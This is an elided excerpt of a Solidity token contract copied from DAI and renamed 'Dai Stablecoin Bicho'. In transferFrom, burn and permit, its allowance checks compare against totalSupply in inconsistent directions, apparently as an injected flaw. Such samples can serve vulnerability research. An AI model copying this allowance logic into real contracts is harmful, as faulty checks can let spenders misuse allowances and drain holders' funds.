...
contract DAI is LibNote {
  ...
  event Transfer(address indexed src, address indexed dst, uint wad);
    ...
    // --- ERC20 Data ---
    string  public constant name     = "Dai Stablecoin Bicho";
    string  public constant symbol   = "DAIB";
    ...
    function transferFrom(address src, address dst, uint wad) public returns (bool) {
      ...
      require(balanceOf[src] >= wad, "Dai/insufficient-balance");
        if (src != msg.sender && _allowance( src, msg.sender ) < totalSupply) {
    ...
    function burn(address usr, uint wad) external {
        ...
        if (usr != msg.sender && _allowance( usr, msg.sender ) > totalSupply) {
                    ...
                    bool allowed, uint8 v, bytes32 r, bytes32 s) external
    {
        ...
        uint wad = allowed ? totalSupply : 0;
